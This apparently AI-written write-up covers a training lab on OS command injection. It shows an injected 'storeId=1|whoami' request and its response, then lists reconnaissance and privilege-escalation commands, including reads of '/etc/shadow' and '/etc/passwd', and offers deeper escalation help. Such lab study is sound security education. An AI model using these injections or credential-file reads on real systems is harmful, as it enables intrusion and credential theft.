Here's a detailed write-up for the lab:  

---

# **OS Command Injection: Simple Case**  

## **Lab Description**  
This lab demonstrates a basic **OS Command Injection** vulnerability in a product stock checker. The application constructs a shell command using user-supplied input for `productId` and `storeId` parameters and returns the command output in the response.  

Our goal is to **execute the `whoami` command** to retrieve the username of the current system user.  

---

## **Exploiting the Vulnerability**  

### **Step 1: Intercept the Stock Check Request**
1. Open **Burp Suite** and enable **Intercept**.
2. Visit the stock checker feature in the lab and submit a request to check a product's stock.
3. Capture the request in Burp Suite.

---

### **Step 2: Modify the `storeId` Parameter**
1. Locate the `storeId` parameter in the intercepted request.
2. Modify its value to inject a command:  
   ```
   storeId=1|whoami
   ```
   The vertical bar (`|`) is a **command separator**, allowing us to execute multiple commands.

---

### **Step 3: Forward the Request**
1. Forward the modified request.
2. Observe the response, which contains the username of the system user.

---

## **Example Exploit Request**  
```http
POST /product/stock HTTP/2
Host: 0a4a000b03acd4228aac7c3e00d80088.web-security-academy.net
Cookie: session=uJghLlBoVdxyL3mscrKewmnmGakPIC5b
Content-Length: 28
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: */*
Origin: https://0a4a000b03acd4228aac7c3e00d80088.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4a000b03acd4228aac7c3e00d80088.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

productId=1&storeId=1|whoami
```

---

## **Example Response**
```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 13

peter-5ULXNT
```
The response contains the system username (`peter-5ULXNT`), confirming successful command execution.

---

## **Understanding the Vulnerability**  
The application fails to **sanitize user input** before incorporating it into a system command. This allows an attacker to **inject arbitrary commands** using shell metacharacters like `|`, `&&`, `;`, or `&`.

---

## **Impact of OS Command Injection**
- **Privilege Escalation**: If an attacker gains access to sensitive system information.
- **Data Exfiltration**: Attackers can execute commands like `cat /etc/passwd` (on Linux) to extract user details.
- **Remote Code Execution (RCE)**: Further exploitation could lead to **complete system compromise**.

---

## **Mitigation Strategies**
To prevent OS command injection, developers should:
1. **Use Parameterized Commands**: Instead of executing raw shell commands, use **safe APIs** like `execFile` in Node.js or `subprocess.run` in Python.
2. **Validate User Input**: Restrict input to only expected values (e.g., numeric IDs).
3. **Use Allowlists**: Only allow predefined values for parameters like `storeId`.
4. **Escape User Input**: Use functions like `shlex.quote()` (Python) or `escapeshellarg()` (PHP) to escape special characters.

---

## **Conclusion**
This lab highlights the dangers of **OS Command Injection** and emphasizes the importance of **secure coding practices**. By injecting `whoami`, we successfully retrieved the system's username, demonstrating how poorly sanitized input can lead to **serious security vulnerabilities**.

---

This write-up provides a clear **step-by-step exploit** and explains the **impact and mitigations**. Let me know if you want any modifications! 🚀





Great job! These reconnaissance commands help you gather essential details about the target system after identifying an **OS Command Injection** vulnerability. Here's why each command is useful:  

### **1. Identify the Current User**
- **Linux:** `whoami`
- **Windows:** `whoami`  
🔹 Helps determine the privilege level of your session. If it's `root` (Linux) or `Administrator` (Windows), you might have high privileges.

### **2. Get Operating System Details**
- **Linux:** `uname -a`
- **Windows:** `ver`  
🔹 Provides system version and architecture, which can help in crafting further exploits.

### **3. Retrieve Network Configuration**
- **Linux:** `ifconfig` (or `ip a` for newer distros)  
- **Windows:** `ipconfig /all`  
🔹 Lists active network interfaces, IP addresses, and DNS servers, which can be useful for lateral movement.

### **4. Check Active Network Connections**
- **Linux:** `netstat -an`
- **Windows:** `netstat -an`  
🔹 Shows open ports and active connections, revealing possible attack vectors.

### **5. List Running Processes**
- **Linux:** `ps -ef`  
- **Windows:** `tasklist`  
🔹 Helps identify running applications and services, which could reveal vulnerable software.

---

If you're able to execute these commands, you can move on to **privilege escalation** by checking:
- **Linux:** `sudo -l`, `id`, `cat /etc/shadow`
- **Windows:** `whoami /priv`, `net user`, `systeminfo`  

Let me know if you want to test deeper privilege escalation techniques! 🚀